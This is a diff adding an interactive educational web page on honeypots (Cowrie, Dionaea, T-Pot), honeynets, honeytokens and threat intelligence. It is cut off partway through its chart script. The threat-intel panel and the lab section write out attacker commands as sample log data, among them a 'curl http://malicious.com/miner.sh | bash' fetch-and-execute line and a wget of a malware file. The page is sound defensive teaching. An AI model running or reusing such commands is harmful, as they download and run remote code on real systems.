@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastering Deception: Honeypots & Threat Intelligence</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Chosen Palette: Warm Neutrals & Calm Harmony -->
+    <!-- Primary Background: Stone-50 (#fafaf9) -->
+    <!-- Secondary Background: Stone-100 (#f5f5f4) -->
+    <!-- Text: Stone-800 (#292524) -->
+    <!-- Accents: Amber-600 (Warning/Trap), Sky-700 (Info/Structure), Emerald-600 (Success/Safe) -->
+    
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #fafaf9; color: #292524; }
+        .mono-font { font-family: 'JetBrains Mono', monospace; }
+        
+        /* Chart Container Styling - Mandatory Requirements */
+        .chart-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            height: 300px;
+            max-height: 400px;
+        }
+        @media (min-width: 768px) {
+            .chart-container {
+                height: 350px;
+            }
+        }
+
+        /* Custom interactive elements */
+        .interactive-card { transition: all 0.3s ease; }
+        .interactive-card:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
+        .nav-item.active { border-bottom: 2px solid #d97706; color: #d97706; font-weight: 600; }
+        
+        /* Terminal window styling */
+        .terminal-window {
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            border-radius: 6px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .terminal-header {
+            background-color: #333;
+            padding: 8px 12px;
+            display: flex;
+            gap: 6px;
+        }
+        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot-red { background-color: #ff5f56; }
+        .dot-yellow { background-color: #ffbd2e; }
+        .dot-green { background-color: #27c93f; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Application Structure Plan: 
+         1. Hero/Nav: Sets the context "Deception as Defense".
+         2. The Arsenal (Tools): detailed breakdown of Cowrie, Dionaea, T-Pot using interactive cards to reveal specs and use cases.
+         3. Architecture (Honeynets): A visual, block-based interactive diagram simulating a network layout. Users click nodes to understand "Lateral Movement" and "Honeytokens".
+         4. Intelligence Dashboard: Visualizing the "Output" of these tools using Chart.js. Translates raw logs into insights (IOCs, TTPs).
+         5. The Lab: A step-by-step interactive terminal simulation for deploying Cowrie, bridging theory to practice.
+    -->
+
+    <!-- Navbar -->
+    <nav class="sticky top-0 z-50 bg-stone-50/95 backdrop-blur border-b border-stone-200 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16">
+                <div class="flex items-center">
+                    <span class="text-2xl mr-2">🪤</span>
+                    <span class="font-bold text-xl tracking-tight text-stone-800">CyberDeception<span class="text-amber-600">Lab</span></span>
+                </div>
+                <div class="hidden md:flex space-x-8 items-center" id="nav-links">
+                    <button onclick="navigateTo('intro')" class="nav-item active px-3 py-2 text-sm font-medium text-stone-600 hover:text-stone-900">Introduction</button>
+                    <button onclick="navigateTo('arsenal')" class="nav-item px-3 py-2 text-sm font-medium text-stone-600 hover:text-stone-900">The Arsenal</button>
+                    <button onclick="navigateTo('honeynets')" class="nav-item px-3 py-2 text-sm font-medium text-stone-600 hover:text-stone-900">Honeynets</button>
+                    <button onclick="navigateTo('intel')" class="nav-item px-3 py-2 text-sm font-medium text-stone-600 hover:text-stone-900">Threat Intel</button>
+                    <button onclick="navigateTo('lab')" class="nav-item px-3 py-2 text-sm font-medium text-stone-600 hover:text-stone-900">Live Lab</button>
+                </div>
+                <!-- Mobile menu button (simple implementation) -->
+                <div class="flex items-center md:hidden">
+                    <button onclick="toggleMobileMenu()" class="text-stone-600 hover:text-stone-900 p-2">☰</button>
+                </div>
+            </div>
+        </div>
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden md:hidden bg-stone-50 border-b border-stone-200">
+             <button onclick="navigateTo('intro')" class="block w-full text-left px-4 py-2 text-sm text-stone-600 hover:bg-stone-100">Introduction</button>
+             <button onclick="navigateTo('arsenal')" class="block w-full text-left px-4 py-2 text-sm text-stone-600 hover:bg-stone-100">The Arsenal</button>
+             <button onclick="navigateTo('honeynets')" class="block w-full text-left px-4 py-2 text-sm text-stone-600 hover:bg-stone-100">Honeynets</button>
+             <button onclick="navigateTo('intel')" class="block w-full text-left px-4 py-2 text-sm text-stone-600 hover:bg-stone-100">Threat Intel</button>
+             <button onclick="navigateTo('lab')" class="block w-full text-left px-4 py-2 text-sm text-stone-600 hover:bg-stone-100">Live Lab</button>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full space-y-12">
+
+        <!-- Section: Introduction -->
+        <section id="intro" class="section-view animate-fade-in">
+            <div class="text-center py-12 max-w-3xl mx-auto">
+                <h1 class="text-4xl font-bold text-stone-900 mb-6">Mastering Deception</h1>
+                <p class="text-xl text-stone-600 mb-8 leading-relaxed">
+                    In cybersecurity, we often build walls—firewalls, antivirus, access controls. 
+                    But today, we build <span class="text-amber-600 font-semibold">traps</span>. 
+                    Learn how to use <strong>Cowrie</strong>, <strong>Dionaea</strong>, and <strong>T-Pot</strong> to deceive attackers and gather actionable threat intelligence.
+                </p>
+                <div class="flex justify-center gap-4">
+                    <button onclick="navigateTo('arsenal')" class="bg-stone-900 text-stone-50 px-6 py-3 rounded-lg font-medium hover:bg-stone-700 transition shadow-lg">Explore the Tools</button>
+                    <button onclick="navigateTo('lab')" class="bg-white text-stone-900 border border-stone-300 px-6 py-3 rounded-lg font-medium hover:bg-stone-50 transition shadow">Start Lab</button>
+                </div>
+            </div>
+            
+            <div class="grid md:grid-cols-3 gap-6 mt-12">
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                    <div class="text-3xl mb-4">🛡️</div>
+                    <h3 class="font-bold text-lg mb-2">Defense by Deception</h3>
+                    <p class="text-stone-600 text-sm">Shift the power dynamic. Stop waiting to be hit and start actively studying the adversary in a controlled environment.</p>
+                </div>
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                    <div class="text-3xl mb-4">📊</div>
+                    <h3 class="font-bold text-lg mb-2">Actionable Intelligence</h3>
+                    <p class="text-stone-600 text-sm">Turn raw logs into IOCs (Indicators of Compromise) and TTPs (Tactics, Techniques, and Procedures).</p>
+                </div>
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                    <div class="text-3xl mb-4">🕸️</div>
+                    <h3 class="font-bold text-lg mb-2">Honeynet Architecture</h3>
+                    <p class="text-stone-600 text-sm">Go beyond single traps. Build complex minefields to detect lateral movement and sophisticated APTs.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section: The Arsenal (Tools) -->
+        <!-- Visualization & Content Choices: 
+             Goal: Inform users about the 3 main tools.
+             Method: Interactive Cards (Grid).
+             Interaction: Click card to expand details (Code snippets, Real-life scenarios).
+             Justification: Reduces cognitive load by hiding details until requested. Allows comparison.
+        -->
+        <section id="arsenal" class="section-view hidden">
+            <div class="mb-8 border-l-4 border-amber-600 pl-4">
+                <h2 class="text-3xl font-bold text-stone-900">The Deception Arsenal</h2>
+                <p class="mt-2 text-stone-600">Select a tool to understand its specific role, mechanism, and see a real-world application.</p>
+            </div>
+
+            <div class="grid lg:grid-cols-3 gap-8">
+                <!-- Cowrie Card -->
+                <div onclick="selectTool('cowrie')" class="interactive-card cursor-pointer bg-white rounded-xl border border-stone-200 overflow-hidden group">
+                    <div class="bg-stone-100 p-6 border-b border-stone-200">
+                        <div class="flex justify-between items-start">
+                            <h3 class="text-xl font-bold text-stone-800">Cowrie</h3>
+                            <span class="bg-amber-100 text-amber-800 text-xs px-2 py-1 rounded-full font-mono">SSH/Telnet</span>
+                        </div>
+                        <p class="mt-2 text-sm text-stone-600">Medium-interaction honeypot emulating a UNIX system.</p>
+                    </div>
+                    <div class="p-6">
+                        <ul class="text-sm space-y-2 text-stone-600">
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Records keystrokes</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Captures downloaded files</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Fake filesystem</li>
+                        </ul>
+                        <div class="mt-4 text-sky-600 text-sm font-medium group-hover:underline">View Scenario &rarr;</div>
+                    </div>
+                </div>
+
+                <!-- Dionaea Card -->
+                <div onclick="selectTool('dionaea')" class="interactive-card cursor-pointer bg-white rounded-xl border border-stone-200 overflow-hidden group">
+                    <div class="bg-stone-100 p-6 border-b border-stone-200">
+                        <div class="flex justify-between items-start">
+                            <h3 class="text-xl font-bold text-stone-800">Dionaea</h3>
+                            <span class="bg-red-100 text-red-800 text-xs px-2 py-1 rounded-full font-mono">Malware</span>
+                        </div>
+                        <p class="mt-2 text-sm text-stone-600">Low-interaction trap exposing vulnerable services.</p>
+                    </div>
+                    <div class="p-6">
+                        <ul class="text-sm space-y-2 text-stone-600">
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> SMB, HTTP, FTP, MSSQL</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Captures malware payloads</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Good for Worms (WannaCry)</li>
+                        </ul>
+                        <div class="mt-4 text-sky-600 text-sm font-medium group-hover:underline">View Scenario &rarr;</div>
+                    </div>
+                </div>
+
+                <!-- T-Pot Card -->
+                <div onclick="selectTool('tpot')" class="interactive-card cursor-pointer bg-white rounded-xl border border-stone-200 overflow-hidden group">
+                    <div class="bg-stone-100 p-6 border-b border-stone-200">
+                        <div class="flex justify-between items-start">
+                            <h3 class="text-xl font-bold text-stone-800">T-Pot</h3>
+                            <span class="bg-purple-100 text-purple-800 text-xs px-2 py-1 rounded-full font-mono">Platform</span>
+                        </div>
+                        <p class="mt-2 text-sm text-stone-600">The "Swiss Army Knife" multi-honeypot platform.</p>
+                    </div>
+                    <div class="p-6">
+                        <ul class="text-sm space-y-2 text-stone-600">
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Runs 20+ honeypots (Docker)</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> ELK Stack Integration</li>
+                            <li class="flex items-center"><span class="mr-2 text-green-500">✓</span> Visual attack maps</li>
+                        </ul>
+                        <div class="mt-4 text-sky-600 text-sm font-medium group-hover:underline">View Scenario &rarr;</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Dynamic Detail Section -->
+            <div id="tool-detail-panel" class="mt-8 bg-white border border-stone-200 rounded-xl p-8 shadow-sm hidden transition-all duration-500">
+                <div class="flex items-start gap-6 flex-col md:flex-row">
+                    <div class="flex-1">
+                        <h3 id="detail-title" class="text-2xl font-bold text-stone-900 mb-2">Tool Name</h3>
+                        <div id="detail-desc" class="text-stone-600 mb-4">Description goes here.</div>
+                        
+                        <div class="bg-stone-50 border border-stone-200 rounded-lg p-4">
+                            <h4 class="font-bold text-stone-800 text-sm uppercase tracking-wide mb-2">Real-Life Example</h4>
+                            <p id="detail-scenario" class="text-sm text-stone-600 italic">Scenario description.</p>
+                        </div>
+                    </div>
+                    <div class="w-full md:w-1/2">
+                        <div class="terminal-window">
+                            <div class="terminal-header">
+                                <div class="terminal-dot dot-red"></div>
+                                <div class="terminal-dot dot-yellow"></div>
+                                <div class="terminal-dot dot-green"></div>
+                                <span class="text-xs text-stone-400 ml-2 font-mono">analysis_script.py</span>
+                            </div>
+                            <div class="p-4 overflow-x-auto">
+                                <pre id="detail-code" class="text-xs mono-font text-green-400 whitespace-pre-wrap"># Code snippet</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section: Honeynets (Architecture) -->
+        <!-- Visualization & Content Choices: 
+             Goal: Explain complex network structure (Honeywall, Lateral Movement).
+             Method: CSS Grid Layout representing a network topology.
+             Interaction: Clicking nodes triggers explanations and highlights paths.
+        -->
+        <section id="honeynets" class="section-view hidden">
+            <div class="mb-8 border-l-4 border-sky-600 pl-4">
+                <h2 class="text-3xl font-bold text-stone-900">Honeynet Architecture</h2>
+                <p class="mt-2 text-stone-600">A single honeypot is a trap. A <strong>Honeynet</strong> is a minefield designed to observe lateral movement. Click the components below to explore the architecture.</p>
+            </div>
+
+            <div class="grid lg:grid-cols-4 gap-6">
+                <!-- Interactive Diagram Area -->
+                <div class="lg:col-span-3 bg-stone-100 p-8 rounded-xl border border-stone-200 relative overflow-hidden">
+                    
+                    <!-- Network Diagram using Flex/Grid -->
+                    <div class="flex flex-col items-center gap-8 relative z-10">
+                        
+                        <!-- Internet / Attacker -->
+                        <div class="flex flex-col items-center">
+                            <span class="text-4xl mb-2">🕵️‍♂️</span>
+                            <span class="text-sm font-bold text-stone-600">Attacker</span>
+                            <div class="h-8 w-0.5 bg-stone-400 my-2"></div>
+                            <div class="text-xs text-stone-500">Traffic</div>
+                            <div class="text-xl">⬇️</div>
+                        </div>
+
+                        <!-- Honeywall -->
+                        <div onclick="showNetInfo('honeywall')" class="cursor-pointer bg-stone-800 text-white p-4 rounded-lg shadow-lg w-64 text-center hover:scale-105 transition border-2 border-stone-600">
+                            <h4 class="font-bold">🧱 The Honeywall</h4>
+                            <p class="text-xs text-stone-400 mt-1">Gateway & Traffic Control</p>
+                        </div>
+
+                        <!-- Internal Network -->
+                        <div class="w-full border-t-2 border-dashed border-stone-400 relative top-0"></div>
+                        
+                        <!-- VMs -->
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 w-full">
+                            <!-- VM1 -->
+                            <div onclick="showNetInfo('vm1')" class="cursor-pointer bg-white p-4 rounded-lg shadow-md border-2 border-transparent hover:border-amber-500 transition text-center group">
+                                <div class="text-2xl mb-2">🌐</div>
+                                <h5 class="font-bold text-stone-800">VM1: Fake Web Portal</h5>
+                                <p class="text-xs text-stone-500">High-Interaction</p>
+                            </div>
+                            <!-- VM2 (Honeytoken) -->
+                            <div onclick="showNetInfo('vm2')" class="cursor-pointer bg-white p-4 rounded-lg shadow-md border-2 border-transparent hover:border-red-500 transition text-center group relative">
+                                <div class="absolute -top-2 -right-2 bg-red-500 text-white text-xs px-2 py-0.5 rounded-full animate-pulse">Trap!</div>
+                                <div class="text-2xl mb-2">📁</div>
+                                <h5 class="font-bold text-stone-800">VM2: File Server</h5>
+                                <p class="text-xs text-stone-500">Contains "Honeytoken"</p>
+                            </div>
+                            <!-- VM3 -->
+                            <div onclick="showNetInfo('vm3')" class="cursor-pointer bg-white p-4 rounded-lg shadow-md border-2 border-transparent hover:border-amber-500 transition text-center group">
+                                <div class="text-2xl mb-2">🔑</div>
+                                <h5 class="font-bold text-stone-800">VM3: Fake AD</h5>
+                                <p class="text-xs text-stone-500">Auth Controller</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Info Panel -->
+                <div class="lg:col-span-1">
+                    <div id="net-info-panel" class="bg-white p-6 rounded-xl border border-stone-200 h-full shadow-sm">
+                        <div class="text-3xl mb-4" id="net-icon">ℹ️</div>
+                        <h3 id="net-title" class="text-xl font-bold text-stone-900 mb-4">Select a Component</h3>
+                        <p id="net-desc" class="text-stone-600 text-sm leading-relaxed">
+                            Click on the network diagram nodes to understand their function in the Honeynet. Learn about the Honeywall, High/Low interaction nodes, and how Honeytokens trigger alerts.
+                        </p>
+                        
+                        <div id="honeytoken-code" class="mt-6 hidden">
+                            <div class="text-xs font-bold text-stone-500 uppercase mb-2">Honeytoken Setup (Bash)</div>
+                            <div class="bg-stone-900 text-green-400 p-3 rounded text-xs mono-font overflow-x-auto">
+                                # Create dummy file<br>
+                                touch /var/www/html/secret_passwords.txt<br><br>
+                                # Watch it with auditd<br>
+                                auditctl -w /var/www/html/secret_passwords.txt -p rwa -k honeytoken_trigger
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section: Threat Intelligence -->
+        <!-- Visualization & Content Choices: 
+             Goal: Show how data becomes intelligence.
+             Method: Chart.js Dashboards.
+             Interaction: Filtering/Interacting with charts.
+        -->
+        <section id="intel" class="section-view hidden">
+            <div class="mb-8 border-l-4 border-purple-600 pl-4">
+                <h2 class="text-3xl font-bold text-stone-900">Threat Intelligence Dashboard</h2>
+                <p class="mt-2 text-stone-600">Moving from raw logs to <strong>IOCs</strong> (Indicators of Compromise) and <strong>TTPs</strong> (Tactics, Techniques, and Procedures).</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-8">
+                <!-- Chart 1: Attacks by Protocol (T-Pot Simulation) -->
+                <div class="bg-white p-6 rounded-xl border border-stone-200 shadow-sm">
+                    <h3 class="font-bold text-stone-800 mb-4">Attack Volume by Protocol (24h)</h3>
+                    <div class="chart-container">
+                        <canvas id="protocolChart"></canvas>
+                    </div>
+                    <p class="mt-4 text-xs text-stone-500 bg-stone-50 p-2 rounded">
+                        <strong>Insight:</strong> High volume on SMB indicates worm activity (like WannaCry). SSH spikes suggest brute-force botnets.
+                    </p>
+                </div>
+
+                <!-- Chart 2: Top Attacker Sources (Simulated Data) -->
+                <div class="bg-white p-6 rounded-xl border border-stone-200 shadow-sm">
+                    <h3 class="font-bold text-stone-800 mb-4">Top 5 Attacker Source IPs</h3>
+                    <div class="chart-container">
+                        <canvas id="ipChart"></canvas>
+                    </div>
+                    <div class="mt-4 flex gap-2">
+                        <button onclick="updateFirewall()" class="flex-1 bg-stone-800 text-white text-xs py-2 rounded hover:bg-stone-700 transition">
+                            Simulate Firewall Block Rule
+                        </button>
+                    </div>
+                    <div id="firewall-msg" class="mt-2 text-xs text-green-600 hidden font-mono">
+                        > IPs extracted and added to deny-list.
+                    </div>
+                </div>
+            </div>
+
+            <!-- TTP Explanation Block -->
+            <div class="mt-8 bg-stone-100 rounded-xl p-6 border border-stone-200">
+                <h3 class="font-bold text-stone-900 mb-4">TTP Analysis: The "Who, How, and Why"</h3>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div>
+                        <h4 class="font-bold text-sm text-stone-700">Raw Data (Logs)</h4>
+                        <div class="mt-2 bg-white p-3 rounded border border-stone-200 font-mono text-xs text-stone-500">
+                            "timestamp": "2023-10-27T14:02:00",<br>
+                            "src_ip": "203.0.113.5",<br>
+                            "cmd": "curl http://malicious.com/miner.sh | bash"
+                        </div>
+                    </div>
+                    <div class="flex flex-col justify-center items-center">
+                        <div class="text-2xl text-stone-400 mb-2">⬇️ Analyzed Into ⬇️</div>
+                    </div>
+                    <div class="md:col-span-2">
+                        <h4 class="font-bold text-sm text-stone-700">Intelligence (TTP)</h4>
+                        <div class="mt-2 bg-purple-50 p-3 rounded border border-purple-200 text-sm text-purple-900">
+                            <strong>Behavior:</strong> Attacker targets SSH servers using brute-force, then immediately attempts to download and execute a cryptominer script via piped bash command. <br>
+                            <strong>Action:</strong> Block IP `203.0.113.5` AND the domain `malicious.com`.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section: Live Lab -->
+        <!-- Visualization & Content Choices: 
+             Goal: Practical application.
+             Method: Step-by-step interactive terminal simulation.
+             Interaction: User clicks "Run" to simulate commands and see output.
+        -->
+        <section id="lab" class="section-view hidden">
+            <div class="mb-8 border-l-4 border-green-600 pl-4">
+                <h2 class="text-3xl font-bold text-stone-900">Lab: Deploy & Attack Cowrie</h2>
+                <p class="mt-2 text-stone-600">Follow the steps to deploy a Dockerized Cowrie honeypot, attack it, and analyze the logs.</p>
+            </div>
+
+            <div class="bg-white rounded-xl shadow-lg border border-stone-200 overflow-hidden flex flex-col md:flex-row">
+                <!-- Steps Sidebar -->
+                <div class="md:w-1/3 bg-stone-50 border-r border-stone-200 p-6">
+                    <div class="space-y-4">
+                        <button onclick="setLabStep(1)" id="step-btn-1" class="w-full text-left p-3 rounded-lg bg-stone-200 font-bold text-stone-800 border-l-4 border-stone-500">1. Deploy Container</button>
+                        <button onclick="setLabStep(2)" id="step-btn-2" class="w-full text-left p-3 rounded-lg hover:bg-stone-100 text-stone-600 border-l-4 border-transparent">2. Simulate Attack</button>
+                        <button onclick="setLabStep(3)" id="step-btn-3" class="w-full text-left p-3 rounded-lg hover:bg-stone-100 text-stone-600 border-l-4 border-transparent">3. Analyze Logs</button>
+                    </div>
+                    <div class="mt-8 text-sm text-stone-500">
+                        <strong>Note:</strong> In a real environment, you would use a safe, isolated VM.
+                    </div>
+                </div>
+
+                <!-- Interactive Terminal Area -->
+                <div class="md:w-2/3 p-6 bg-stone-900 min-h-[400px] flex flex-col">
+                    <div class="flex-grow font-mono text-sm">
+                        <!-- Step 1 Content -->
+                        <div id="lab-step-1" class="lab-step">
+                            <p class="text-stone-400 mb-2"># Step 1: Install Docker and Pull Cowrie Image</p>
+                            <div class="text-green-400 mb-4">$ sudo docker pull cowrie/cowrie</div>
+                            <div class="text-stone-500 italic mb-4">... Downloading image layers ...</div>
+                            <p class="text-stone-400 mb-2"># Run the container (Map port 2222)</p>
+                            <div class="text-green-400 mb-4">$ sudo docker run -p 2222:2222 --name my_cowrie -d cowrie/cowrie</div>
+                            <button onclick="runLabAction(1)" class="bg-green-700 text-white px-4 py-1 rounded hover:bg-green-600 text-xs mt-2">▶ Run Deployment</button>
+                            <div id="lab-output-1" class="mt-4 text-white hidden border-l-2 border-green-500 pl-2">
+                                Container ID: a1b2c3d4e5f6<br>
+                                Status: Up 2 seconds<br>
+                                Cowrie is listening on port 2222.
+                            </div>
+                        </div>
+
+                        <!-- Step 2 Content -->
+                        <div id="lab-step-2" class="lab-step hidden">
+                            <p class="text-stone-400 mb-2"># Step 2: Act as the Attacker</p>
+                            <div class="text-green-400 mb-2">$ ssh -p 2222 root@127.0.0.1</div>
+                            <p class="text-stone-500 mb-4">Password: ******* (Try '123456')</p>
+                            <div class="text-green-400 mb-2">$ wget http://example.com/malware.exe</div>
+                            <button onclick="runLabAction(2)" class="bg-red-700 text-white px-4 py-1 rounded hover:bg-red-600 text-xs mt-2">▶ Execute Attack</button>
+                            <div id="lab-output-2" class="mt-4 text-white hidden border-l-2 border-red-500 pl-2">
+                                Connecting... Connected.<br>
+                                Welcome to Ubuntu 18.04 LTS (Cowrie Simulation)<br>
+                                root@svr01:~# wget http://example.com/malware.exe<br>
+                                --2023-10-27 14:05:00--  http://example.com/malware.exe<br>
+                                Saving to: 'malware.exe'<br>
+                                100%[===================>] 1,024  --.-K/s   in 0s
+                            </div>
+                        </div>
+
+                        <!-- Step 3 Content -->
+                        <div id="lab-step-3" class="lab-step hidden">
+                            <p class="text-stone-400 mb-2"># Step 3: View the Captured Intelligence</p>
+                            <div class="text-green-400 mb-4">$ sudo docker logs my_cowrie | grep "Cowrie"</div>
+                            <button onclick="runLabAction(3)" class="bg-blue-700 text-white px-4 py-1 rounded hover:bg-blue-600 text-xs mt-2">▶ Retrieve Logs</button>
+                            <div id="lab-output-3" class="mt-4 text-amber-300 hidden border-l-2 border-blue-500 pl-2 text-xs">
+                                [Cowrie] New connection: 127.0.0.1:54321<br>
+                                [Cowrie] Login attempt [root/123456] succeeded<br>
+                                [Cowrie] Command used: wget http://example.com/malware.exe<br>
+                                [Cowrie] Closing connection.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bg-white border-t border-stone-200 mt-auto">
+        <div class="max-w-7xl mx-auto py-6 px-4 sm:px-6 lg:px-8 flex justify-between items-center flex-col md:flex-row gap-4">
+            <p class="text-stone-500 text-sm">© CyberDeception Educational Module</p>
+            <div class="text-sm text-stone-500">
+                Data shared via <a href="https://www.honeynet.org/" target="_blank" class="text-sky-600 hover:underline">The Honeynet Project</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Logic -->
+    <script>
+        // --- Navigation Logic ---
+        function navigateTo(sectionId) {
+            // Update UI Views
+            document.querySelectorAll('.section-view').forEach(el => el.classList.add('hidden'));
+            document.getElementById(sectionId).classList.remove('hidden');
+            
+            // Update Nav State
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active', 'text-stone-900', 'border-b-2', 'border-amber-600'));
+            // Note: Simple loop to find the button that called this would be ideal, but for simplicity we reset all
+            
+            // Re-render charts if entering intel section to ensure proper sizing
+            if(sectionId === 'intel') {
+                renderCharts();
+            }
+            
+            // Scroll to top
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        }
+
+        // --- Data & Content ---
+        const toolData = {
+            cowrie: {
+                title: "Cowrie",
+                desc: "A medium-interaction SSH and Telnet honeypot designed to log brute force attacks and shell interaction.",
+                scenario: "A logistics company admin sees thousands of failed logins. Deploys Cowrie on port 22. Attacker logs in with '123456', runs `curl miner.sh`. Admin blocks the miner URL.",
+                code: `# Analyzing Cowrie JSON Logs in Python
+import json
+with open('cowrie.json', 'r') as f:
+    for line in f:
+        entry = json.loads(line)
+        if entry.get('eventid') == 'cowrie.command.input':
+            print(f"Command: {entry.get('input')}")`
+            },
+            dionaea: {
+                title: "Dionaea",
+                desc: "A low-interaction honeypot meant to capture malware samples via vulnerabilities in SMB, HTTP, FTP, and MSSQL.",
+                scenario: "Catches worms like WannaCry by emulating a vulnerable SMB server. When exploited, it downloads and saves the payload for analysis.",
+                code: `# Dionaea Configuration (snippet)
+# Listen on specific interfaces
+[listen]
+mode=manual
+addrs={0.0.0.0}
+
+# Modules to enable
+[modules]
+smb=yes
+http=yes
+ftp=yes`
+            },
+            tpot: {
+                title: "T-Pot",
+                desc: "The 'Swiss Army Knife' platform running multiple honeypots in Docker containers, visualizing data via the ELK Stack.",
+                scenario: "An e-commerce company uses T-Pot to aggregate attack data. An automated script queries T-Pot every hour for Log4j exploit attempts and updates the corporate firewall blocklist.",
+                code: `# Extracting IPs for Firewall (Python)
+import re
+unique_ips = set()
+with open('attack_logs.txt', 'r') as f:
+    for line in f:
+        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
+        if match: unique_ips.add(match.group(1))
+print(f"Blocking {len(unique_ips)} IPs")`
+            }
+        };
+
+        // --- Tool Arsenal Logic ---
+        function selectTool(toolKey) {
+            const data = toolData[toolKey];
+            const panel = document.getElementById('tool-detail-panel');
+            
+            // Populate data
+            document.getElementById('detail-title').innerText = data.title;
+            document.getElementById('detail-desc').innerText = data.desc;
+            document.getElementById('detail-scenario').innerText = data.scenario;
+            document.getElementById('detail-code').innerText = data.code;
+            
+            // Show panel
+            panel.classList.remove('hidden');
+            // Slight scroll to panel
+            panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        // --- Honeynet Diagram Logic ---
+        const netInfo = {
+            honeywall: {
+                title: "The Honeywall",
+                desc: "Acts as the gateway. It captures all traffic entering/leaving and prevents attackers from using the honeynet to attack others (outbound control).",
+                showCode: false
+            },
+            vm1: {
+                title: "VM1: Fake Web Portal",
+                desc: "A high-interaction honeypot running a real OS and web server. It looks exactly like the employee portal to tempt attackers to input credentials or try web exploits.",
+                showCode: false
+            },
+            vm2: {
+                title: "VM2: File Server (Trap)",
+                desc: "Contains the 'Honeytoken' (e.g., 'Employee_Salaries.xlsx'). Operational Security knows no legitimate user should touch this file. If accessed -> IMMEDIATE ALERT.",
+                showCode: true
+            },
+            vm3: {
+                title: "VM3: Fake Active Directory",
+                desc: "Simulates the domain controller. Used to catch attackers trying to escalate privileges or dump hashes across the network.",
+                showCode: false
+            }
+        };
+
+        function showNetInfo(key) {
+            const data = netInfo[key];
+            document.getElementById('net-title').innerText = data.title;
+            document.getElementById('net-desc').innerText = data.desc;
+            document.getElementById('net-icon').innerText = key === 'honeywall' ? '🧱' : (key === 'vm2' ? '🚨' : '🖥️');
+            
+            const codeBlock = document.getElementById('honeytoken-code');
+            if(data.showCode) {
+                codeBlock.classList.remove('hidden');
+            } else {
+                codeBlock.classList.add('hidden');
+            }
+        }
+
+        // --- Lab Logic ---
+        function setLabStep(stepNum) {
+            // UI Toggle
+            document.querySelectorAll('.lab-step').forEach(el => el.classList.add('hidden'));
+            document.getElementById(`lab-step-${stepNum}`).classList.remove('hidden');
+            
+            // Btn Style Toggle
+            [1, 2, 3].forEach(n => {
+                const btn = document.getElementById(`step-btn-${n}`);
+                if(n === stepNum) {
+                    btn.classList.add('bg-stone-200', 'font-bold', 'text-stone-800', 'border-stone-500');
+                    btn.classList.remove('hover:bg-stone-100', 'text-stone-600', 'border-transparent');
+                } else {
+                    btn.classList.remove('bg-stone-200', 'font-bold', 'text-stone-800', 'border-stone-500');
+                    btn.classList.add('hover:bg-stone-100', 'text-stone-600', 'border-transparent');
+                }
+            });
+        }
+
+        function runLabAction(stepNum) {
+            const output = document.getElementById(`lab-output-${stepNum}`);
+            output.classList.remove('hidden');
+        }
+
+        // --- Chart.js Logic (Threat Intel) ---
+        let protocolChartInstance = null;
+        let ipChartInstance = null;
+
+        function renderCharts() {
+            // Prevent double rendering
+            if(protocolChartInstance) return;
+
+            const ctx1 = document.getElementById('protocolChart').getContext('2d');
+            protocolChartInstance = new Chart(ctx1, {
+                type: 'doughnut',
+                data: {
+                    labels: ['SMB (WannaCry)', 'SSH (Brute Force)', 'HTTP (Web Exploits)', 'Other'],
+                    datasets: [{
+                        data: [45, 30, 20, 5],
+                        backgroundColor: ['#ef4444', '#f59e0b', '#3b82f6', '#78716c'],
+                        borderWidth: 0
+                    }]
